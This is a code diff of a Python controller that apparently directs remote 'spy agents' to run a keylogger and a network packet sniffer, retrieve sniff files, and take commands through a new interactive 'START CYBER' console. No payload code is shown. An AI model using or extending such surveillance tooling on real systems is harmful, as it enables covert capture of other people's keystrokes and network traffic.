@@ -12,6 +12,7 @@ import configparser
 from random import randint
 from operation import Operation
 from icecream import ic
+import UI
 
 
 HOST = "localhost"
@@ -69,13 +70,15 @@ def main():
     kligPar = Params()
     kligPar.kligP = kligPrams(40)
     kligP = ContParams(KligerType, kligPar)
+    print("--------Running kigger----------")
     print(spyAgent.runContraption(kligP, 10))
-    sleep(20)
+    sleep(40)
     print(spyAgent.haltContraption(10))
-    sniffP = ContParams(SnifferType, Params(SniffParams(20, b"eth0")))
-    print(spyAgent.runContraption(sniffP, 10))
-    sleep(30)
-    print(spyAgent.retrieve_file("0.sniff"))
+    print("--------Stopping kigger----------")
+    # sniffP = ContParams(SnifferType, Params(SniffParams(20, b"ens33")))
+    # print(spyAgent.runContraption(sniffP, 10))
+    # sleep(30)
+    # print(spyAgent.retrieve_file("0.sniff"))
 
 
 def main_with_ui():
@@ -90,6 +93,18 @@ def main_with_ui():
     manegerRecruiter.start()
     spyRecruiter.start()
 
+    ui = UI.UI(operDict)
+    ui.help()
+
+    print('START CYBER:')
+    value = input('$ ')
+    while value != 'q':
+        UI.call_method_raw(ui, value)
+        selected = ui.ctx.selected_operation
+        if selected:
+            value = input(f'<{selected}>$ ')
+        else: 
+            value = input(f'$ ')
 
 if __name__ == "__main__":
-    main()
+    main_with_ui()
